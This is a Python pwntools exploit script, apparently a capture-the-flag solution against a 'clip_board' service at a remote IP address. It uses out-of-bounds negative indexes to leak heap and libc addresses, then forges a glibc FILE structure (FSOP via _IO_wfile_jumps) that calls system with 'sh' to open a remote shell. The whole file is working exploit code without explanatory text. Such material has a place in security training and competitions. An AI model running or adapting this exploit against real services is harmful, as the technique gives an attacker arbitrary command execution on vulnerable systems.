```python
#type: ignore
from pwn import *

context.terminal = ['tmux', 'new-window']

# p = process('./clip_board')
p = remote("43.201.64.101", "8888")
libc = ELF('/usr/lib/x86_64-linux-gnu/libc.so.6')
           
def add(idx, size, data):
    p.sendlineafter('> ', '1')
    p.sendlineafter('> ', str(idx))
    p.sendlineafter('> ', str(size))
    p.sendafter('> ', data.ljust(size, b'\x00'))

def delete(idx):
    p.sendlineafter('> ', '2')
    p.sendlineafter('> ', str(idx))

def view(idx):
    p.sendlineafter('> ', '3')
    p.sendlineafter('> ', str(idx))
           
p.recvuntil(': ')
heap_leak = int(p.recvline(), 16)
log.success("Heap leak: " + hex(heap_leak))

add(9, 0xe0, b'A'*0xd0)
add(8, 0xe0, b'A'*0xd0)
add(1, 0xe0, b'A'*0xd0)
view(-4)
libc_base = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')) - 0x21a803
log.success("Libc base: " + hex(libc_base))

delete(9)

# gdb.attach(p, gdbscript = '''
# b _IO_wdoallocbuf
# ''')
           
def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

_IO_file_jumps = libc_base + libc.symbols['_IO_file_jumps']
fsop_addr = heap_leak + 0x30

FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
        lock            = fsop_addr + 0x10, \
        _wide_data      = fsop_addr - 0x28, \
        _markers        = libc_base + libc.symbols['system'], \
        _mode           = 0xffffffff, \
        vtable          = libc_base + libc.symbols['_IO_wfile_jumps'] - 0x20, \
        __pad5          = fsop_addr - 0x8
        )
           
add(-4, len(FSOP), FSOP)
           
p.interactive()
```